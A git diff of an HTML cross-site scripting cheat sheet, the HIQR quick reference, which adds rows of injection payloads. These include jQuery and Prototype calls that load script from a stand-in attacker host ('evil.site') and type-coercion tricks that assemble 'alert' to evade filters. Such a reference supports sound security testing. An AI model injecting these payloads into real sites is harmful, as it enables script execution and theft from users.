@@ -53,8 +53,8 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
 
 -->
 <h1>HTML Injection Quick Reference (HIQR)</h1>
-<div style="float:left">Mike Shema, <a href="http://deadliestwebattacks.com">Deadliest Web Attacks</a></div>
-<div style="float:right">Last Revision: 2013-06-25 [ <a href="https://github.com/mutantzombie/HIQR">HIQR @ GitHub</a> ]</div>
+<div style="float:left">Mike Shema, <a href="http://deadliestwebattacks.com/">Deadliest Web Attacks</a></div>
+<div style="float:right">Repository: [ <a href="https://github.com/mutantzombie/HIQR">HIQR @ GitHub</a> ]</div>
 <div id="hiqr_toc" style="clear:both">
 <br>
 <a href="#hiqr_table_1">Table 1</a>: Injection Techniques for Various Parsing Contexts<br>
@@ -324,7 +324,7 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
   <tr>
   <td class="example">window[<span class="payload">/alert/.source</span>](9)
 <tr>
-  <td rowspan="7">Harness functions from a JavaScript library
+  <td rowspan="9">Harness functions from a JavaScript library
   <td rowspan="2"><a href="http://angularjs.org/">Angular</a>
   <td class="example">angular.bind(self, alert, 9)()
   <tr>
@@ -333,8 +333,13 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
   <td><a href="http://emberjs.com/">Ember JS</a>
   <td class="example">Ember.run(null, alert, 9)
   <tr>
-  <td><a href="http://jquery.com">jQuery</a>
+  <td rowspan="2"><a href="http://jquery.com/">jQuery</a>
   <td class="example">$.getScript("//evil.site/")
+  <tr>
+  <td class="example">$.globalEval(alert(9))
+  <tr>
+  <td><a href="http://prototypejs.org/">Prototype</a>
+  <td class="example">new Ajax.Request('http://evil.site/a.js',<br>{onsuccess:function(transport){transport.headerJSON}})
   <tr>
   <td rowspan="3"><a href="http://underscorejs.org/">Underscore</a>
   <td class="example">_.defer(alert, 9)
@@ -343,18 +348,18 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
   <tr>
   <td class="example">_.once(alert(9))
 <tr>
-  <td rowspan="8">Type coercion
-  <td rowspan="2">1) Boolean + Object to String
-  <td class="example">false + "" = "false"
+  <td rowspan="9">Type coercion
+  <td rowspan="2">1) Boolean + Object converts to String
+  <td class="example">false + "" == "false"
   <tr>
   <td class="example">![] + []
   <tr>
-  <td rowspan="2">2) String by index to character
-  <td class="example">( false + "" )[1] = "a"
+  <td rowspan="2">2) Extract character from String by index
+  <td class="example">( false + "" )[1] == "a"
   <tr>
   <td class="example">( ![] + [] )[1]
   <tr>
-  <td rowspan="2">3) Compose string
+  <td rowspan="2">3) Compose String from characters
   <td class="example">"alert"
   <tr>
   <td class="example">(![]+[])[1] +<br>
@@ -363,8 +368,10 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
 (!![]+[])[1] +<br>
 (!![]+[])[0]
   <tr>
-  <td rowspan="2">4) Function by method lookup
+  <td rowspan="3">4) Execute function by method lookup
   <td class="example">(window["alert"])(9)
+  <tr>
+  <td class="example">(window["ale"+"rt"])(9)
   <tr>
   <td class="example">(window[(![]+[])[1] + (![]+[])[2] + (![]+[])[4] +<br>
  (!![]+[])[1] + (!![]+[])[0]])(9)
